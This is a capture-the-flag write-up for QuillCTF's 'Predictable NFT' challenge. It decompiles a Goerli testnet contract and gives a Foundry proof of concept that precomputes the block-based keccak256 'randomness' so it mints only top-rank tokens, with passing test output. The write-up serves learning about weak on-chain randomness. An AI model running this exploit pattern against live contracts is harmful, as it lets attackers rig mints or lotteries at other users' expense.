# QuillCTF : Predictable NFT

## Objective of CTF

In this game, you can spend 1 ether to "mint" an NFT token with 3 possible ranks: Common(1), Rare(2), and Superior(3). As a hacker, your goal is to always mint the Superior ones.

### Contract:
So this time, the contract isn't open source, but who needs that anyway? 


You can find the underlying contract of this game on the Goerli Testnet.

Contract Address: 0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC


We can decompile the bytecode on that address :
```
def mint() payable: 
  if call.value != 10^18:
      revert with 0, 'show me the money'
  if id > id + 1:
      revert with 0, 17
  id++
  if sha3(id, caller, block.number) % 100 > 90:
      tokens[stor0] = 3
  else:
      if sha3(id, caller, block.number) % 100 <= 80:
          tokens[stor0] = 1
      else:
          tokens[stor0] = 2
  return id
```

To mint an NFT, we have to pay 1 ether as value, also the keccak256 hash of id, caller and block number need to be greater than 90 after mod 100

We can just check if the id, caller and block number match the requirement on each block until it match the requirement, then call the `mint()` function

## Proof of concept

### Foundry test

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^ 0.8.19;

import "forge-std/Test.sol";

contract PredictableNFTTest is Test {
	address nft;

	address hacker = address(0x1234);

	function setUp() public {
		vm.createSelectFork("goerli");
		vm.deal(hacker, 1 ether);
		nft = address(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);
	}

	function test() public {
		vm.startPrank(hacker);
		uint mintedId;
		uint currentBlockNum = block.number;

		// Mint a Superior one, and do it within the next 100 blocks.
		for(uint i=0; i<100; i++) {
			vm.roll(currentBlockNum);

			// ---- hacking time ----
			(, bytes memory id) = nft.call(abi.encodeWithSignature("id()"));
			if (uint256(keccak256(abi.encode(abi.decode(id, (uint256)) + 1, hacker, block.number))) % 100 > 90) {
			    (, bytes memory minted) = nft.call{value: 1 ether}(abi.encodeWithSignature("mint()"));
			    mintedId = abi.decode(minted, (uint256));
			    console.log("Minted : ", mintedId);
			    (, bytes memory rank) = nft.call(abi.encodeWithSignature("tokens(uint256)", mintedId));
			    console.log("Rank : ", abi.decode(rank, (uint256)));
			    break;
                        }
			currentBlockNum++;
		}

		// get rank from `mapping(tokenId => rank)`
		(, bytes memory ret) = nft.call(abi.encodeWithSignature(
			"tokens(uint256)",
			mintedId
		));
		uint mintedRank = uint(bytes32(ret));
		assertEq(mintedRank, 3, "not Superior(rank != 3)");
	}
}
```

### Foundry test output

```
# forge test --match-path test/predictableNFT.t.sol -vv
[⠑] Compiling...
No files changed, compilation skipped

Running 1 test for test/predictableNFT.t.sol:PredictableNFTTest
[PASS] test() (gas: 149332)
Logs:
  Minted :  1
  Rank :  3

Test result: ok. 1 passed; 0 failed; finished in 1.32s
```